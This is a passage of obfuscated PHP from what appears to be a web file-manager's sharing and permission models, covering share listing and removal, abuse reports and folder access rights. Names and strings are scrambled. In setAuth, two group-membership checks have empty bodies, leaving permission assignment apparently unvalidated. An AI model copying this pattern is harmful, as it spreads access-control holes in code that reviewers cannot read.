$∏Ú·êœÒ = $ê¬õ≥«[50] . $⁄áÊ◊∞œ . $ê¬õ≥«[50]; $õË¡≈Ùä = array($ê¬õ≥«[467] => array($ê¬õ≥«[7], $ÜÃîû≥¬), $ê¬õ≥«[521] => array($ê¬õ≥«[378], "\45{$∏Ú·êœÒ}\x25"), $ê¬õ≥«[431] => 0); $’ö—¬⁄¢ = Model($ê¬õ≥«[818])->where($õË¡≈Ùä)->field($ê¬õ≥«[1971])->find(); if (!$’ö—¬⁄¢) { return !1; } $—âÄéµÛ = substr($’ö—¬⁄¢[$ê¬õ≥«[521]], strpos($’ö—¬⁄¢[$ê¬õ≥«[521]], $∏Ú·êœÒ)); $õË¡≈Ùä = array($ê¬õ≥«[403] => array($ê¬õ≥«[7], trim($—âÄéµÛ, $ê¬õ≥«[50]))); $‚Âç’€π = Model($ê¬õ≥«[818])->where($õË¡≈Ùä)->field($ê¬õ≥«[32])->select(); $¢’ÓÅÒÉ = array_to_keyvalue($‚Âç’€π, $ê¬õ≥«[12], $ê¬õ≥«[32]); $¢’ÓÅÒÉ[] = $’ö—¬⁄¢[$ê¬õ≥«[32]]; return implode($ê¬õ≥«[8], $¢’ÓÅÒÉ); } protected function remove($ ±∫•ΩÛ) { $¡é†ﬂ˘” =& $_SERVER[Çâä∆◊¡]; if (is_array($ ±∫•ΩÛ)) { $ ±∫•ΩÛ = array($¡é†ﬂ˘”[7], $ ±∫•ΩÛ); } $àºÌ˘Ó’ = array($¡é†ﬂ˘”[488] => $ ±∫•ΩÛ); $ôÚ´Ê∂“ = $this->where($àºÌ˘Ó’)->delete(); if ($ôÚ´Ê∂“) { Model($¡é†ﬂ˘”[596])->where(array($¡é†ﬂ˘”[488] => $ ±∫•ΩÛ))->delete(); } $™óØåõ‚ = is_array($ ±∫•ΩÛ) ? $ ±∫•ΩÛ[1] : array($ ±∫•ΩÛ); for ($‡©ç‚õ = 0; $‡©ç‚õ < count($™óØåõ‚); $‡©ç‚õ++) { $ÜÄ´ÿ◊ = $this->getInfo($™óØåõ‚[$‡©ç‚õ]); if ($ÜÄ´ÿ◊[$¡é†ﬂ˘”[495]] == $¡é†ﬂ˘”[89]) { Model($¡é†ﬂ˘”[564])->eventShare($ÜÄ´ÿ◊[$¡é†ﬂ˘”[403]], $¡é†ﬂ˘”[1960]); } if ($ÜÄ´ÿ◊[$¡é†ﬂ˘”[493]] == $¡é†ﬂ˘”[89]) { Model($¡é†ﬂ˘”[564])->eventShare($ÜÄ´ÿ◊[$¡é†ﬂ˘”[403]], $¡é†ﬂ˘”[1959]); } } return $ôÚ´Ê∂“; } protected function removeBySource($áﬂ·òó—) { $õﬁ®…±ü =& $_SERVER[Çâä∆◊¡]; $Û≠◊Ÿ¿ê = array($õﬁ®…±ü[418] => array($õﬁ®…±ü[419], $áﬂ·òó—)); $°Ÿﬁ™Íç = $this->field($õﬁ®…±ü[488])->where($Û≠◊Ÿ¿ê)->select(); $°Ÿﬁ™Íç = array_to_keyvalue($°Ÿﬁ™Íç, $õﬁ®…±ü[12], $õﬁ®…±ü[488]); if (!$°Ÿﬁ™Íç) { return; } $Û≠◊Ÿ¿ê = array($õﬁ®…±ü[487] => array($õﬁ®…±ü[419], $°Ÿﬁ™Íç)); $this->where($Û≠◊Ÿ¿ê)->delete(); Model($õﬁ®…±ü[596])->where($Û≠◊Ÿ¿ê)->delete(); } public function listAll($Ó°•ê±Ã) { $ÈﬂïÍ • =& $_SERVER[Çâä∆◊¡]; $Ã¬ÑÆ¿ã = array(); if ($Ó°•ê±Ã[$ÈﬂïÍ •[1642]]) { $Ã¬ÑÆ¿ã[$ÈﬂïÍ •[1642]] = $Ó°•ê±Ã[$ÈﬂïÍ •[1642]]; } if ($Ó°•ê±Ã[$ÈﬂïÍ •[754]]) { $¸¢∫À„€ = $Ó°•ê±Ã[$ÈﬂïÍ •[496]] ? $Ó°•ê±Ã[$ÈﬂïÍ •[496]] : strtotime(date($ÈﬂïÍ •[1972])); $Ã¬ÑÆ¿ã[$ÈﬂïÍ •[193]] = array($ÈﬂïÍ •[328], array($Ó°•ê±Ã[$ÈﬂïÍ •[754]], $¸¢∫À„€)); } if ($Ó°•ê±Ã[$ÈﬂïÍ •[33]]) { $Ã¬ÑÆ¿ã[$Ó°•ê±Ã[$ÈﬂïÍ •[33]]] = 1; } else { $Ã¬ÑÆ¿ã[] = array($ÈﬂïÍ •[493] => array($ÈﬂïÍ •[999], 0), $ÈﬂïÍ •[495] => array($ÈﬂïÍ •[999], 0), $ÈﬂïÍ •[1949] => $ÈﬂïÍ •[1905]); } if ($Ó°•ê±Ã[$ÈﬂïÍ •[1901]]) { $Ã¬ÑÆ¿ã[] = array($ÈﬂïÍ •[490] => $Ó°•ê±Ã[$ÈﬂïÍ •[1901]], $ÈﬂïÍ •[1539] => array($ÈﬂïÍ •[378], "\45{$Ó°•ê±Ã[$ÈﬂïÍ •[1901]]}\x25"), $ÈﬂïÍ •[1949] => $ÈﬂïÍ •[1905]); } $¿ÖöÉÁ∆ = $this->_makeOrder()->where($Ã¬ÑÆ¿ã)->selectPage(20); if (empty($¿ÖöÉÁ∆[$ÈﬂïÍ •[364]])) { return array(); } $this->_listDataApply($¿ÖöÉÁ∆[$ÈﬂïÍ •[364]]); return $¿ÖöÉÁ∆; } public function listDataApply($Ê≥èîö€) { $this->_listDataApply($Ê≥èîö€); return $Ê≥èîö€; } private function _listDataApply(&$∫“Éû∑ù) { $‰•ÔâåÌ =& $_SERVER[Çâä∆◊¡]; $÷†Æ•¡‹ = array_to_keyvalue($∫“Éû∑ù, $‰•ÔâåÌ[12], $‰•ÔâåÌ[1642]); $Ã¡∆ˆ®” = Model($‰•ÔâåÌ[538])->userListInfo(array_unique($÷†Æ•¡‹)); $Ω¨ıΩÄ¯ = array_to_keyvalue($∫“Éû∑ù, $‰•ÔâåÌ[12], $‰•ÔâåÌ[403]); $‚ƒàÈí¸ = Model($‰•ÔâåÌ[818])->sourceListInfo($Ω¨ıΩÄ¯, !0); foreach ($∫“Éû∑ù as $µ„•ø—È => &$Ô≥Ó·øü) { $°≠∞Æè‹ = $Ô≥Ó·øü[$‰•ÔâåÌ[1642]]; $Ô≥Ó·øü[$‰•ÔâåÌ[1973]] = $Ã¡∆ˆ®”[$°≠∞Æè‹] ? $Ã¡∆ˆ®”[$°≠∞Æè‹] : !1; $ªüÆßôÜ = $Ô≥Ó·øü[$‰•ÔâåÌ[403]]; $Ô≥Ó·øü[$‰•ÔâåÌ[87]] = $‚ƒàÈí¸[$ªüÆßôÜ] ? $‚ƒàÈí¸[$ªüÆßôÜ] : !1; if ($Ô≥Ó·øü[$‰•ÔâåÌ[87]][$‰•ÔâåÌ[431]] == $‰•ÔâåÌ[89]) { unset($∫“Éû∑ù[$µ„•ø—È]); } if ($Ô≥Ó·øü[$‰•ÔâåÌ[87]] != $‰•ÔâåÌ[190] && !$Ô≥Ó·øü[$‰•ÔâåÌ[87]]) { unset($∫“Éû∑ù[$µ„•ø—È]); } } unset($Ô≥Ó·øü); $∫“Éû∑ù = array_values($∫“Éû∑ù); } private function _makeOrder($§µ≈ë∞ô = '') { $≈æ¿¡€µ =& $_SERVER[Çâä∆◊¡]; $‚ôåÇóê = array($≈æ¿¡€µ[193], $≈æ¿¡€µ[496], $≈æ¿¡€µ[1962], $≈æ¿¡€µ[1963]); $Ô÷‘æÕ‹ = array($≈æ¿¡€µ[448] => $≈æ¿¡€µ[449], $≈æ¿¡€µ[450] => $≈æ¿¡€µ[451]); $ƒäﬂîÎâ = Input::get($≈æ¿¡€µ[455], $≈æ¿¡€µ[7], $≈æ¿¡€µ[424], $‚ôåÇóê); $â ê§”æ = Input::get($≈æ¿¡€µ[456], $≈æ¿¡€µ[7], $≈æ¿¡€µ[1974], array($≈æ¿¡€µ[1900], $≈æ¿¡€µ[450])); $â ê§”æ = $Ô÷‘æÕ‹[$â ê§”æ]; $§µ≈ë∞ô = $§µ≈ë∞ô . "{$ƒäﬂîÎâ}\40{$â ê§”æ}"; return $this->order($§µ≈ë∞ô); } public function reportAdd($çêÂä¬Å) { $∑˘Ï¸Ë® =& $_SERVER[Çâä∆◊¡]; $ãÀÍ†¶÷ = array($∑˘Ï¸Ë®[488] => $çêÂä¬Å[$∑˘Ï¸Ë®[488]], $∑˘Ï¸Ë®[1642] => USER_ID); if (Model($∑˘Ï¸Ë®[1970])->where($ãÀÍ†¶÷)->find()) { return !1; } $òêËêÑê = array($∑˘Ï¸Ë®[488] => $çêÂä¬Å[$∑˘Ï¸Ë®[488]], $∑˘Ï¸Ë®[1539] => $çêÂä¬Å[$∑˘Ï¸Ë®[1539]], $∑˘Ï¸Ë®[403] => $çêÂä¬Å[$∑˘Ï¸Ë®[403]], $∑˘Ï¸Ë®[467] => $çêÂä¬Å[$∑˘Ï¸Ë®[467]], $∑˘Ï¸Ë®[1642] => USER_ID, $∑˘Ï¸Ë®[33] => $çêÂä¬Å[$∑˘Ï¸Ë®[33]], $∑˘Ï¸Ë®[451] => $çêÂä¬Å[$∑˘Ï¸Ë®[451]]); return Model($∑˘Ï¸Ë®[1970])->add($òêËêÑê); } public function reportList($ˆ≠ÚŒ˜¨) { $ÜØ˙é¿Ô =& $_SERVER[Çâä∆◊¡]; $›¿÷¢Á˚ = array(); if ($ˆ≠ÚŒ˜¨[$ÜØ˙é¿Ô[754]]) { $çúÓ…ŸΩ = $ˆ≠ÚŒ˜¨[$ÜØ˙é¿Ô[496]] ? $ˆ≠ÚŒ˜¨[$ÜØ˙é¿Ô[496]] : strtotime(date($ÜØ˙é¿Ô[1972])); $›¿÷¢Á˚[$ÜØ˙é¿Ô[193]] = array($ÜØ˙é¿Ô[328], array($ˆ≠ÚŒ˜¨[$ÜØ˙é¿Ô[754]], $çúÓ…ŸΩ)); } if (isset($ˆ≠ÚŒ˜¨[$ÜØ˙é¿Ô[33]]) && in_array($ˆ≠ÚŒ˜¨[$ÜØ˙é¿Ô[33]], array($ÜØ˙é¿Ô[89], $ÜØ˙é¿Ô[435], $ÜØ˙é¿Ô[1975], $ÜØ˙é¿Ô[1976], $ÜØ˙é¿Ô[1977]))) { $›¿÷¢Á˚[$ÜØ˙é¿Ô[33]] = $ˆ≠ÚŒ˜¨[$ÜØ˙é¿Ô[33]]; } if (isset($ˆ≠ÚŒ˜¨[$ÜØ˙é¿Ô[743]]) && in_array($ˆ≠ÚŒ˜¨[$ÜØ˙é¿Ô[743]], array($ÜØ˙é¿Ô[190], $ÜØ˙é¿Ô[89], $ÜØ˙é¿Ô[435], $ÜØ˙é¿Ô[1975]))) { $›¿÷¢Á˚[$ÜØ˙é¿Ô[743]] = $ˆ≠ÚŒ˜¨[$ÜØ˙é¿Ô[743]]; } $ŸêÃôË = Input::get($ÜØ˙é¿Ô[456], $ÜØ˙é¿Ô[7], $ÜØ˙é¿Ô[1974], array($ÜØ˙é¿Ô[1900], $ÜØ˙é¿Ô[450])); $åÛó¿î◊ = array($ÜØ˙é¿Ô[448] => $ÜØ˙é¿Ô[449], $ÜØ˙é¿Ô[450] => $ÜØ˙é¿Ô[451]); $ˆ«œ»ä» = $ÜØ˙é¿Ô[1978] . $åÛó¿î◊[$ŸêÃôË]; $´Ï«∆•≥ = Model($ÜØ˙é¿Ô[1970])->where($›¿÷¢Á˚)->order($ˆ«œ»ä»)->selectPage(20); if (empty($´Ï«∆•≥[$ÜØ˙é¿Ô[364]])) { return array(); } $µåñﬁÜ˝ = array_to_keyvalue_group($´Ï«∆•≥[$ÜØ˙é¿Ô[364]], $ÜØ˙é¿Ô[743], $ÜØ˙é¿Ô[488]); if (!empty($µåñﬁÜ˝[0])) { $ˆ≠ÚŒ˜¨ = $µåñﬁÜ˝[0]; $›¿÷¢Á˚ = array($ÜØ˙é¿Ô[488] => array($ÜØ˙é¿Ô[7], $ˆ≠ÚŒ˜¨)); $›™ ÄâÏ = $this->where($›¿÷¢Á˚)->field($ÜØ˙é¿Ô[488])->select(); $›™ ÄâÏ = array_to_keyvalue($›™ ÄâÏ, $ÜØ˙é¿Ô[12], $ÜØ˙é¿Ô[488]); $≠Ó˘±◊‘ = array_diff($ˆ≠ÚŒ˜¨, $›™ ÄâÏ); if (!empty($≠Ó˘±◊‘)) { foreach ($´Ï«∆•≥[$ÜØ˙é¿Ô[364]] as $Ëäì»É≠ => $’á‰üÁ˛) { if (in_array($’á‰üÁ˛[$ÜØ˙é¿Ô[488]], $≠Ó˘±◊‘)) { unset($´Ï«∆•≥[$ÜØ˙é¿Ô[364]][$Ëäì»É≠]); } } } } $this->_listDataApply($´Ï«∆•≥[$ÜØ˙é¿Ô[364]]); return $´Ï«∆•≥; } public function reportStatus($é»˜ªÚô) { $¨ø¬‘Ÿ˘ =& $_SERVER[Çâä∆◊¡]; $ò¸‚œ√≈ = array($¨ø¬‘Ÿ˘[401] => $é»˜ªÚô[$¨ø¬‘Ÿ˘[401]]); $≠Æ—úÍ∏ = Model($¨ø¬‘Ÿ˘[1970])->where($ò¸‚œ√≈)->field($¨ø¬‘Ÿ˘[1979])->find(); if (!$≠Æ—úÍ∏) { return !1; } $Ú≥êê ﬁ = array($¨ø¬‘Ÿ˘[743] => $é»˜ªÚô[$¨ø¬‘Ÿ˘[743]]); if ($é»˜ªÚô[$¨ø¬‘Ÿ˘[743]] == $¨ø¬‘Ÿ˘[1975] && $≠Æ—úÍ∏[$¨ø¬‘Ÿ˘[743]] == $¨ø¬‘Ÿ˘[1975]) { $Ú≥êê ﬁ[$¨ø¬‘Ÿ˘[743]] = 0; } $ŸèΩ÷¶à = Model($¨ø¬‘Ÿ˘[1970])->where($ò¸‚œ√≈)->save($Ú≥êê ﬁ); if ($é»˜ªÚô[$¨ø¬‘Ÿ˘[743]] == $¨ø¬‘Ÿ˘[435]) { if ($≠Æ—úÍ∏[$¨ø¬‘Ÿ˘[467]] != $¨ø¬‘Ÿ˘[190] && $this->shareFileMeta($≠Æ—úÍ∏[$¨ø¬‘Ÿ˘[467]])) { $this->shareFileMeta($≠Æ—úÍ∏[$¨ø¬‘Ÿ˘[467]], 0); } $this->remove($≠Æ—úÍ∏[$¨ø¬‘Ÿ˘[488]]); return !0; } if ($ŸèΩ÷¶à && $é»˜ªÚô[$¨ø¬‘Ÿ˘[743]] == $¨ø¬‘Ÿ˘[1975]) { $â·Øäíƒ = $Ú≥êê ﬁ[$¨ø¬‘Ÿ˘[743]] == $¨ø¬‘Ÿ˘[1975] ? 1 : 0; $this->shareFileMeta($≠Æ—úÍ∏[$¨ø¬‘Ÿ˘[467]], $â·Øäíƒ); $this->removeByFile($≠Æ—úÍ∏[$¨ø¬‘Ÿ˘[467]]); } return $ŸèΩ÷¶à; } private function removeByFile($ﬁëÂ»‡¶) { $Ò¥∂—›π =& $_SERVER[Çâä∆◊¡]; $ì‘–öÔ∆ = Model($Ò¥∂—›π[818])->where(array($Ò¥∂—›π[467] => $ﬁëÂ»‡¶))->field($Ò¥∂—›π[403])->select(); $ ü˘æ˙ñ = array_to_keyvalue($ì‘–öÔ∆, $Ò¥∂—›π[12], $Ò¥∂—›π[403]); $‚çê§Í∏ = array($Ò¥∂—›π[403] => array($Ò¥∂—›π[7], $ ü˘æ˙ñ), $Ò¥∂—›π[493] => 1); $ì‘–öÔ∆ = $this->where($‚çê§Í∏)->field($Ò¥∂—›π[488])->select(); if (empty($ì‘–öÔ∆)) { return; } $∫ﬁà≤∆¨ = array_to_keyvalue($ì‘–öÔ∆, $Ò¥∂—›π[12], $Ò¥∂—›π[488]); $this->remove($∫ﬁà≤∆¨); } private function shareFileMeta($∞º»ù‘·, $¶äèæˆ– = null) { $¬πàˆóò =& $_SERVER[Çâä∆◊¡]; $£ø∏◊ó˛ = array($¬πàˆóò[467] => $∞º»ù‘·, $¬πàˆóò[95] => $¬πàˆóò[1980]); if (is_null($¶äèæˆ–)) { return Model($¬πàˆóò[1981])->where($£ø∏◊ó˛)->find(); } $£ø∏◊ó˛[$¬πàˆóò[369]] = $¶äèæˆ–; Model($¬πàˆóò[1981])->add($£ø∏◊ó˛, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\157\165\162\143\x65\137\x61\x75\164\x68"; public function getAuth($˝Ö†›Áı) { $¶øÓëå∆ =& $_SERVER[Çâä∆◊¡]; $‘ßô†îÎ = $this->sourceAuthSelect($˝Ö†›Áı); $–ÃÆ–êÙ = array(); $„»•˙˛Ô = array(); $≥ä∆ÃäÉ = 2 << 25; foreach ($‘ßô†îÎ as $ıüûΩèò) { $Ãâ¢÷¥§ = Model($¶øÓëå∆[507])->listData($ıüûΩèò[$¶øÓëå∆[1911]]); if (!$Ãâ¢÷¥§) { continue; } $–ÃÆ–êÙ[] = $ıüûΩèò; $Éá òê¿ = 0; if ($ıüûΩèò[$¶øÓëå∆[412]] == SourceModel::TYPE_GROUP) { $Éá òê¿ = $≥ä∆ÃäÉ * 2; } if ($ıüûΩèò[$¶øÓëå∆[412]] == SourceModel::TYPE_USER) { $Éá òê¿ = $≥ä∆ÃäÉ; } if ($ıüûΩèò[$¶øÓëå∆[412]] == SourceModel::TYPE_USER && $ıüûΩèò[$¶øÓëå∆[504]] == $¶øÓëå∆[190]) { $Éá òê¿ = 0; } $„»•˙˛Ô[] = $Ãâ¢÷¥§[$¶øÓëå∆[414]] + $Éá òê¿; } array_multisort($„»•˙˛Ô, SORT_DESC, $–ÃÆ–êÙ); return $–ÃÆ–êÙ; } public function sourceAuthSelect($¸”ı£ìÑ) { $˝˝€Û¸ë =& $_SERVER[Çâä∆◊¡]; static $óø û©± = array(); $∂–™’’… = is_array($¸”ı£ìÑ) ? !1 : !0; if ($∂–™’’…) { $¸”ı£ìÑ = array($¸”ı£ìÑ); } $Åπóπ°œ = array(); foreach ($¸”ı£ìÑ as $Ç∫œÒøä) { if (isset($óø û©±[$Ç∫œÒøä])) { $Åπóπ°œ[$Ç∫œÒøä] = $óø û©±[$Ç∫œÒøä]; } } if (count($Åπóπ°œ) == count($¸”ı£ìÑ)) { return $∂–™’’… ? $Åπóπ°œ[$¸”ı£ìÑ[0]] : $Åπóπ°œ; } $≥—È·∞… = $˝˝€Û¸ë[1982]; $ÿÈÅ£∫¿ = array($˝˝€Û¸ë[403] => array($˝˝€Û¸ë[7], $¸”ı£ìÑ)); $÷®ˆΩ‹ú = $this->field($≥—È·∞…)->order($˝˝€Û¸ë[401])->where($ÿÈÅ£∫¿)->select(); $ê€◊„¢‰ = array_to_keyvalue_group($÷®ˆΩ‹ú, $˝˝€Û¸ë[403]); foreach ($¸”ı£ìÑ as $Ç∫œÒøä) { $óø û©±[$Ç∫œÒøä] = $ê€◊„¢‰[$Ç∫œÒøä] ? $ê€◊„¢‰[$Ç∫œÒøä] : array(); } if ($∂–™’’…) { return $÷®ˆΩ‹ú; } return $ê€◊„¢‰; } public function setAuth($¬∫·î≠¡, $®ÅáÊı≥) { $ï“ŒÀï£ =& $_SERVER[Çâä∆◊¡]; $ßìπÈÖÓ = Model($ï“ŒÀï£[1312])->sourceInfo($¬∫·î≠¡); if (!$ßìπÈÖÓ) { return !1; } if ($ßìπÈÖÓ[$ï“ŒÀï£[412]] != SourceModel::TYPE_GROUP) { return !1; } $ó—ıœı˙ = 1; $“·Òí¢ = $ßìπÈÖÓ[$ï“ŒÀï£[504]]; if ($“·Òí¢ != $ó—ıœı˙) { $ö¥îáÚû = array($ï“ŒÀï£[1810] => $“·Òí¢); $ãÀ∑›Ç = Model($ï“ŒÀï£[1899])->field($ï“ŒÀï£[1642])->where($ö¥îáÚû)->select(); $ãÀ∑›Ç = array_to_keyvalue($ãÀ∑›Ç, $ï“ŒÀï£[12], $ï“ŒÀï£[1642]); } $ÚÙÙ™Œª = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $ì‡·–¸Ñ = array(); foreach ($®ÅáÊı≥ as $≠Ö˘â˘ƒ) { if (!in_array($≠Ö˘â˘ƒ[$ï“ŒÀï£[412]], $ÚÙÙ™Œª)) { show_json(LNG($ï“ŒÀï£[1983]), !1); } if ($“·Òí¢ != $ó—ıœı˙) { if ($≠Ö˘â˘ƒ[$ï“ŒÀï£[412]] == SourceModel::TYPE_GROUP) { } if ($≠Ö˘â˘ƒ[$ï“ŒÀï£[504]] != 0 && !in_array($≠Ö˘â˘ƒ[$ï“ŒÀï£[504]], $ãÀ∑›Ç)) { } } if ($≠Ö˘â˘ƒ[$ï“ŒÀï£[504]] == 0) { $≠Ö˘â˘ƒ[$ï“ŒÀï£[412]] = SourceModel::TYPE_USER; } $ì‡·–¸Ñ[] = array($ï“ŒÀï£[403] => $¬∫·î≠¡, $ï“ŒÀï£[412] => intval($≠Ö˘â˘ƒ[$ï“ŒÀï£[412]]), $ï“ŒÀï£[504] => intval($≠Ö˘â˘ƒ[$ï“ŒÀï£[504]]), $ï“ŒÀï£[1911] => intval($≠Ö˘â˘ƒ[$ï“ŒÀï£[1911]]) ? intval($≠Ö˘â˘ƒ[$ï“ŒÀï£[1911]]) : 0, $ï“ŒÀï£[1965] => intval($≠Ö˘â˘ƒ[$ï“ŒÀï£[1965]]) ? intval($≠Ö˘â˘ƒ[$ï“ŒÀï£[1965]]) : -1); } $this->where(array($ï“ŒÀï£[418] => $¬∫·î≠¡))->delete(); $this->addAll($ì‡·–¸Ñ); return !0; } public function authClear($ü¨∫…Ë§) { $˛Ùı˘Â» =& $_SERVER[Çâä∆◊¡]; $é’◊õìﬂ = Model($˛Ùı˘Â»[1312])->sourceInfo($ü¨∫…Ë§); $ôØ˝Æ”∂ = array($ü¨∫…Ë§); if ($é’◊õìﬂ[$˛Ùı˘Â»[411]] == $˛Ùı˘Â»[89]) { $¡ùœÁ›œ = array($˛Ùı˘Â»[584] => array($˛Ùı˘Â»[544], $é’◊õìﬂ[$˛Ùı˘Â»[521]] . $ü¨∫…Ë§ . $˛Ùı˘Â»[545])); $ôØ˝Æ”∂ = Model($˛Ùı˘Â»[1312])->field($˛Ùı˘Â»[418])->where($¡ùœÁ›œ)->getField($˛Ùı˘Â»[403], !0); $ôØ˝Æ”∂[] = $ü¨∫…Ë§; } $this->where(array($˛Ùı˘Â»[418] => array($˛Ùı˘Â»[419], $ôØ˝Æ”∂)))->delete(); return !0; } public function getAllChildren($˜˚‘…õ°) { $©èäﬂâò =& $_SERVER[Çâä∆◊¡]; $Ü¢àﬁ·¥ = Model($©èäﬂâò[1312])->sourceInfo($˜˚‘…õ°); if ($Ü¢àﬁ·¥[$©èäﬂâò[411]] != $©èäﬂâò[89]) { return $this->sourceListAuth(array($˜˚‘…õ°)); } if ($Ü¢àﬁ·¥[$©èäﬂâò[412]] != SourceModel::TYPE_GROUP) { return array(); } $ƒë°»˙¶ = 1; $›€‡ê¿å = array($˜˚‘…õ°); if ($Ü¢àﬁ·¥[$©èäﬂâò[498]] == $©èäﬂâò[190] && $Ü¢àﬁ·¥[$©èäﬂâò[504]] != $ƒë°»˙¶) { $›€‡ê¿å = $this->groupChidldAllRootSource($Ü¢àﬁ·¥[$©èäﬂâò[504]]); } $°ﬂ¡π⁄ç = $this->field($©èäﬂâò[403])->group($©èäﬂâò[403])->select(); $°ﬂ¡π⁄ç = array_to_keyvalue($°ﬂ¡π⁄ç, $©èäﬂâò[12], $©èäﬂâò[403]); if (!$°ﬂ¡π⁄ç) { return array(); } $è—ﬁßŒä = $©èäﬂâò[1984]; $ÌŸµ∞ï¡ = array($©èäﬂâò[403] => array($©èäﬂâò[7], $°ﬂ¡π⁄ç), $©èäﬂâò[431] => $©èäﬂâò[190]); $ïÓ¶ÿèÒ = Model($©èäﬂâò[818])->field($è—ﬁßŒä)->where($ÌŸµ∞ï¡)->select(); $¸Ö‚‡Ÿ¶ = array($˜˚‘…õ°); foreach ($ïÓ¶ÿèÒ as $Óµﬂ∆∫≠) { foreach ($›€‡ê¿å as $ëöÈÓ√Á) { $∂™ä˛ô = $©èäﬂâò[50] . $ëöÈÓ√Á . $©èäﬂâò[50]; $èÑ»∏‡¥ = $Óµﬂ∆∫≠[$©èäﬂâò[521]] . $Óµﬂ∆∫≠[$©èäﬂâò[403]] . $©èäﬂâò[50]; if (strstr($èÑ»∏‡¥, $∂™ä˛ô)) { $¸Ö‚‡Ÿ¶[] = $Óµﬂ∆∫≠[$©èäﬂâò[403]]; break; } } } return $this->sourceListAuth($¸Ö‚‡Ÿ¶); } private function sourceListAuth($•ü¬ÙöÅ) { $ïÛ‚àÚÎ =& $_SERVER[Çâä∆◊¡]; $˙ﬁ≈ø›Ü = Model($ïÛ‚àÚÎ[1312])->sourceListInfo($•ü¬ÙöÅ, !0); $µªÁÎ˝™ = $this->sourceAuthSelect($•ü¬ÙöÅ); $ÄÙÒî«Å = array(); $ÏÅ≈Ω’Ü = array(); foreach ($˙ﬁ≈ø›Ü as $ÈÔ—˙¬) { unset($ÈÔ—˙¬[$ïÛ‚àÚÎ[454]]); unset($ÈÔ—˙¬[$ïÛ‚àÚÎ[452]]); unset($ÈÔ—˙¬[$ïÛ‚àÚÎ[414]]); unset($ÈÔ—˙¬[$ïÛ‚àÚÎ[87]]); $ÇÜøãàµ = $µªÁÎ˝™[$ÈÔ—˙¬[$ïÛ‚àÚÎ[403]]]; if (!$ÇÜøãàµ) { continue; } $ÈÔ—˙¬[$ïÛ‚àÚÎ[1985]] = $this->authTargetInfo($ÇÜøãàµ); $ÈÔ—˙¬[$ïÛ‚àÚÎ[519]] = rtrim($ÈÔ—˙¬[$ïÛ‚àÚÎ[525]], $ïÛ‚àÚÎ[8]) . $ïÛ‚àÚÎ[8] . ltrim($ÈÔ—˙¬[$ïÛ‚àÚÎ[519]], $ïÛ‚àÚÎ[8]); $ÄÙÒî«Å[] = $ÈÔ—˙¬; $÷¶â˛Ô£ = count(explode($ïÛ‚àÚÎ[8], trim($ÈÔ—˙¬[$ïÛ‚àÚÎ[519]], $ïÛ‚àÚÎ[8]))); $ÏÅ≈Ω’Ü[] = $÷¶â˛Ô£ + ($ÈÔ—˙¬[$ïÛ‚àÚÎ[33]] == $ïÛ‚àÚÎ[79] ? 0 : 1000); } array_multisort($ÏÅ≈Ω’Ü, SORT_ASC, $ÄÙÒî«Å); return $ÄÙÒî«Å; } private function groupChidldAllRootSource($Å•íˆãï) { $Íª±Çâ∑ =& $_SERVER[Çâä∆◊¡]; $ª„˘ß«ó = Model($Íª±Çâ∑[1986])->groupChildrenAll($Å•íˆãï); $„¢§Ëˆ‘ = array($Íª±Çâ∑[498] => 0, $Íª±Çâ∑[504] => array($Íª±Çâ∑[7], $ª„˘ß«ó), $Íª±Çâ∑[412] => SourceModel::TYPE_GROUP); $ÙÌµÊ÷ã = Model($Íª±Çâ∑[818])->field($Íª±Çâ∑[403])->where($„¢§Ëˆ‘)->select(); $ÙÌµÊ÷ã = array_to_keyvalue($ÙÌµÊ÷ã, $Íª±Çâ∑[12], $Íª±Çâ∑[403]); return $ÙÌµÊ÷ã; } private function authTargetInfo($®˝”ìÖ») { $”®µÈà¸ =& $_SERVER[Çâä∆◊¡]; $ìûÁ¬ﬁı = array(); $ìã¯…Ñ’ = array(); $ë£„õ≠â = 2 << 25; foreach ($®˝”ìÖ» as $‘¨‰”‚ò) { $Éù±ﬂÕã = Model($”®µÈà¸[507])->listData($‘¨‰”‚ò[$”®µÈà¸[1911]]); if (!$Éù±ﬂÕã) { continue; } if ($‘¨‰”‚ò[$”®µÈà¸[412]] == SourceModel::TYPE_USER) { $⁄˚ïŒé– = Model($”®µÈà¸[513])->getInfoSimpleOuter($‘¨‰”‚ò[$”®µÈà¸[504]]); if ($⁄˚ïŒé–[$”®µÈà¸[1642]] == $”®µÈà¸[1175]) { continue; } if ($⁄˚ïŒé–[$”®µÈà¸[1642]] == $”®µÈà¸[190]) { $⁄˚ïŒé–[$”®µÈà¸[32]] = LNG($”®µÈà¸[1987]); } } else { $⁄˚ïŒé– = Model($”®µÈà¸[522])->getInfoSimple($‘¨‰”‚ò[$”®µÈà¸[504]]); } if (!$⁄˚ïŒé–) { continue; } $⁄˚ïŒé–[$”®µÈà¸[466]] = $Éù±ﬂÕã; $ìûÁ¬ﬁı[] = $⁄˚ïŒé–; $Ó‡›âñ· = 0; if ($‘¨‰”‚ò[$”®µÈà¸[412]] == SourceModel::TYPE_GROUP) { $Ó‡›âñ· = $ë£„õ≠â * 2; } if ($‘¨‰”‚ò[$”®µÈà¸[412]] == SourceModel::TYPE_USER) { $Ó‡›âñ· = $ë£„õ≠â; } if ($‘¨‰”‚ò[$”®µÈà¸[412]] == SourceModel::TYPE_USER && $‘¨‰”‚ò[$”®µÈà¸[504]] == $”®µÈà¸[190]) { $Ó‡›âñ· = 0; } $ìã¯…Ñ’[] = $Éù±ﬂÕã[$”®µÈà¸[414]] + $Ó‡›âñ·; } array_multisort($ìã¯…Ñ’, SORT_DESC, $ìûÁ¬ﬁı); return $ìûÁ¬ﬁı; } public function getAllChildrenByUser($¬ñ¥——œ, $¸òΩòÅ≥) { $˝œ∫ﬁ®√ =& $_SERVER[Çâä∆◊¡]; $ÂÏÀƒ‰Ø = Model($˝œ∫ﬁ®√[538])->getInfo($¸òΩòÅ≥); if (!$¸òΩòÅ≥ || !$¬ñ¥——œ || !$ÂÏÀƒ‰Ø) { return array(); } $≈˝Î°ÅΩ = Model($˝œ∫ﬁ®√[1312])->sourceInfo($¬ñ¥——œ); $Ω¯¨ÁœÍ = array(); $á¬‰àÚ˛ = 1; if ($≈˝Î°ÅΩ[$˝œ∫ﬁ®√[498]] == $˝œ∫ﬁ®√[190] && $≈˝Î°ÅΩ[$˝œ∫ﬁ®√[504]] != $á¬‰àÚ˛ && $this->groupContainUser($≈˝Î°ÅΩ[$˝œ∫ﬁ®√[504]], $¸òΩòÅ≥)) { foreach 